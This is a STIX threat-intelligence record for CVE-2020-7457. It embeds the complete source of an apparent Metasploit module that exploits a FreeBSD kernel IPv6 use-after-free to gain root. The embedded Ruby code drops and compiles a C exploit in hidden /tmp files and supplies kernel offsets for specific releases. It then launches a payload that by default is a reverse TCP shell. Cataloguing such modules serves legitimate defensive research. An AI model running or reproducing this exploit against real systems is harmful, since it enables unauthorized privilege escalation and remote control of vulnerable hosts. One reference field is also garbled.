{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1fec2080-bbde-466c-b5c5-271a0ea08169",
    "created": "2024-08-14T16:33:36.437862Z",
    "modified": "2024-08-14T16:33:36.437866Z",
    "name": "FreeBSD ip6_setpktopt Use-After-Free Privilege Escalation",
    "description": " This module exploits a race and use-after-free vulnerability in the FreeBSD kernel IPv6 socket handling. A missing synchronization lock in the `IPV6_2292PKTOPTIONS` option handling in `setsockopt` permits racing `ip6_setpktopt` access to a freed `ip6_pktopts` struct.  This exploit overwrites the `ip6po_pktinfo` pointer of a `ip6_pktopts` struct in freed memory to achieve arbitrary kernel read/write.  This module has been tested successfully on:  FreeBSD 9.0-RELEASE #0 (amd64); FreeBSD 9.1-RELEASE #0 r243825 (amd64); FreeBSD 9.2-RELEASE #0 r255898 (amd64); FreeBSD 9.3-RELEASE #0 r268512 (amd64); FreeBSD 12.0-RELEASE r341666 (amd64); and FreeBSD 12.1-RELEASE r354233 (amd64).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/freebsd/local/ip6_setpktopt_uaf_priv_esc.rb",
            "external_id": "ip6_setpktopt_uaf_priv_esc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-7457"
        },
        {
            "source_name": "reference",
            "url": "https://hackerone.com/reports/826026"
        },
        {
            "source_name": "reference",
            "url": "https://bsdsec.net/articles/freebsd-announce-freebsd-security-advisory-freebsd-sa-20-20-ipv6"
        },
        {
            "source_name": "reference",
            "url": "https://www.freebsd.org/security/patches/SA-20:20/ipv6.patch"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/freebsd/freebsd/blob/master/sys/netinet6/ip6_var.h"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/freebsd/freebsd/blob/master/sys/netinet6/ip6_output.c"
        },
        {
            "source_name": "exploit_data=exploit_data(CVE-2020-7457",
            "external_id": "exploit.c)"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GreatRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Post::File\n  include Msf::Post::Unix\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'FreeBSD ip6_setpktopt Use-After-Free Privilege Escalation',\n        'Description' => %q{\n          This module exploits a race and use-after-free vulnerability in the\n          FreeBSD kernel IPv6 socket handling. A missing synchronization lock\n          in the `IPV6_2292PKTOPTIONS` option handling in `setsockopt` permits\n          racing `ip6_setpktopt` access to a freed `ip6_pktopts` struct.\n\n          This exploit overwrites the `ip6po_pktinfo` pointer of a `ip6_pktopts`\n          struct in freed memory to achieve arbitrary kernel read/write.\n\n          This module has been tested successfully on:\n\n          FreeBSD 9.0-RELEASE #0 (amd64);\n          FreeBSD 9.1-RELEASE #0 r243825 (amd64);\n          FreeBSD 9.2-RELEASE #0 r255898 (amd64);\n          FreeBSD 9.3-RELEASE #0 r268512 (amd64);\n          FreeBSD 12.0-RELEASE r341666 (amd64); and\n          FreeBSD 12.1-RELEASE r354233 (amd64).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Andy Nguyen', # @theflow0 - discovery and exploit\n          'bcoles' # metasploit\n        ],\n        'DisclosureDate' => '2020-07-07',\n        'Platform' => ['bsd'], # FreeBSD\n        'Arch' => [ARCH_X64],\n        'SessionTypes' => ['shell'],\n        'References' => [\n          ['CVE', '2020-7457'],\n          ['EDB', '48644'],\n          ['PACKETSTORM', '158341'],\n          ['URL', 'https://hackerone.com/reports/826026'],\n          ['URL', 'https://bsdsec.net/articles/freebsd-announce-freebsd-security-advisory-freebsd-sa-20-20-ipv6'],\n          ['URL', 'https://www.freebsd.org/security/patches/SA-20:20/ipv6.patch'],\n          ['URL', 'https://github.com/freebsd/freebsd/blob/master/sys/netinet6/ip6_var.h'],\n          ['URL', 'https://github.com/freebsd/freebsd/blob/master/sys/netinet6/ip6_output.c']\n        ],\n        'Targets' => [\n          [\n            'Automatic',\n            {}\n          ],\n          [\n            'FreeBSD 9.0-RELEASE #0',\n            {\n              allproc: '0xf01e40'\n            }\n          ],\n          [\n            'FreeBSD 9.1-RELEASE #0 r243825',\n            {\n              allproc: '0x1028880'\n            }\n          ],\n          [\n            'FreeBSD 9.2-RELEASE #0 r255898',\n            {\n              allproc: '0x11c9ba0'\n            }\n          ],\n          [\n            'FreeBSD 9.3-RELEASE #0 r268512',\n            {\n              allproc: '0x1295800'\n            }\n          ],\n          [\n            'FreeBSD 12.0-RELEASE r341666',\n            {\n              allproc: '0x1df3c38'\n            }\n          ],\n          [\n            'FreeBSD 12.1-RELEASE r354233',\n            {\n              allproc: '0x1df7648'\n            }\n          ],\n        ],\n        'DefaultOptions' => {\n          'PAYLOAD' => 'bsd/x64/shell_reverse_tcp',\n          'PrependFork' => true,\n          'WfsDelay' => 10\n        },\n        'Notes' => {\n          'Reliability' => [REPEATABLE_SESSION],\n          'Stability' => [CRASH_OS_RESTARTS],\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]\n        },\n        'DefaultTarget' => 0\n      )\n    )\n    register_advanced_options([\n      OptInt.new('NUM_SPRAY', [true, 'Spray iterations', 256]),\n      OptInt.new('NUM_SPRAY_RACE', [true, 'Race iterations', 32]),\n      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])\n    ])\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def upload(path, data)\n    print_status(\"Writing '#{path}' (#{data.size} bytes) ...\")\n    rm_f(path)\n    write_file(path, data)\n    register_file_for_cleanup(path)\n  end\n\n  def strip_comments(c_code)\n    c_code.gsub(%r{/\\*.*?\\*/}m, '').gsub(%r{^\\s*//.*$}, '')\n  end\n\n  def select_target(kernel_version)\n    targets.each do |t|\n      return t if kernel_version.include?(t.name)\n    end\n    nil\n  end\n\n  def check\n    kernel_version = cmd_exec('uname -v').to_s\n\n    unless kernel_version.include?('FreeBSD')\n      return CheckCode::Safe('Target system is not FreeBSD')\n    end\n\n    kernel_arch = cmd_exec('uname -m').to_s\n\n    unless kernel_arch.include?('64')\n      return CheckCode::Safe(\"System architecture #{kernel_arch} is not supported\")\n    end\n\n    vprint_good(\"System architecture #{kernel_arch} is supported\")\n\n    unless select_target(kernel_version)\n      return CheckCode::Safe(\"No target for #{kernel_version}\")\n    end\n\n    vprint_good(\"#{kernel_version} appears vulnerable\")\n\n    unless command_exists?('cc')\n      return CheckCode::Safe('cc is not installed')\n    end\n\n    vprint_good('cc is installed')\n\n    CheckCode::Appears\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    unless writable?(base_dir)\n      fail_with(Failure::BadConfig, \"#{base_dir} is not writable\")\n    end\n\n    if target.name == 'Automatic'\n      kernel_version = cmd_exec('uname -v').to_s\n      my_target = select_target(kernel_version)\n      unless my_target\n        fail_with(Failure::NoTarget, \"No target for #{kernel_version}\")\n      end\n    else\n      my_target = target\n    end\n\n    print_status(\"Using target: #{my_target.name} - allproc offset: #{my_target[:allproc]}\")\n\n    exploit_path = \"#{base_dir}/.#{rand_text_alphanumeric(5..10)}\"\n    exploit_data = exploit_data('CVE-2020-7457', 'exploit.c')\n\n    if my_target.name.start_with?('FreeBSD 12')\n      exploit_data.gsub!('// #define FBSD12', '#define FBSD12')\n    end\n\n    exploit_data.gsub!(/#define ALLPROC_OFFSET .*$/, \"#define ALLPROC_OFFSET #{my_target[:allproc]}\")\n\n    exploit_data.gsub!(/#define NUM_SPRAY 0x100/, \"#define NUM_SPRAY #{datastore['NUM_SPRAY']}\")\n    exploit_data.gsub!(/#define NUM_KQUEUES 0x100/, \"#define NUM_KQUEUES #{datastore['NUM_SPRAY']}\")\n    exploit_data.gsub!(/#define NUM_SPRAY_RACE 0x20/, \"#define NUM_SPRAY_RACE #{datastore['NUM_SPRAY_RACE']}\")\n\n    upload(\"#{exploit_path}.c\", strip_comments(exploit_data))\n\n    print_status(\"Compiling #{exploit_path}.c ...\")\n    output = cmd_exec(\"cc '#{exploit_path}.c' -o '#{exploit_path}' -std=c99 -lpthread\")\n    register_file_for_cleanup(exploit_path)\n\n    unless output.blank?\n      print_error(output)\n      fail_with(Failure::Unknown, \"#{exploit_path}.c failed to compile\")\n    end\n\n    payload_path = \"#{base_dir}/.#{rand_text_alphanumeric(5..10)}\"\n\n    upload_and_chmodx(payload_path, generate_payload_exe)\n    register_file_for_cleanup(payload_path)\n\n    timeout = 30\n    print_status(\"Launching exploit (timeout: #{timeout}s) ...\")\n    output = cmd_exec(exploit_path, nil, timeout).to_s\n    output.each_line { |line| vprint_status line.chomp }\n\n    sleep(3)\n\n    print_status(cmd_exec('id').to_s)\n\n    unless is_root?\n      fail_with(Failure::Unknown, 'Exploit completed without elevating privileges')\n    end\n\n    print_good('Success! Executing payload...')\n\n    cmd_exec(\"#{payload_path} & echo \")\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-07-07",
    "x_mitre_platforms": [
        "['bsd'], # FreeBSD"
    ]
}